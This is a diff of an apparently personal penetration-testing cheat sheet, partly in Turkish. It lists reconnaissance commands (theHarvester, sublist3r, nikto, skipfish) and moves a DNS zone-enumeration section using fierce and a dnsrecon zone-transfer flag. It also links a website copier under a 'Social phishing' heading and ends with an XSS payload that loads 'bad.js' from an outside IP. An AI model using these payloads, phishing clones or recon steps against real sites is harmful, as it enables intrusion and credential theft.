@@ -10,6 +10,11 @@ theharvester -d microsoft.com -l 500 -b google -h myresults
 sublist3r -d google.com
 whatweb 
 whois <adress>
+
+----------------------------------------------
+# Dns zone Enum
+fierce -dns <adress>
+dnsrecon -d <adress>  -a -> Dns zone transfer 
 --------------------------------------------
 Social phishing Online
 https://www.toolsbug.com/website-copier-online.php
@@ -53,11 +58,7 @@ reposify.com
 nıkto -h <targetip>
 skipsfish -o <kaydetmeadı> <websitesi>
 
-----------------------------------------------
 
-# Dns zone Enum
-fierce -dns <adress>
-dnsrecon <adress> 
 ----------------------------------------------
 #xss
 <script src="http://192.168.1.50:81/bad.js></script>
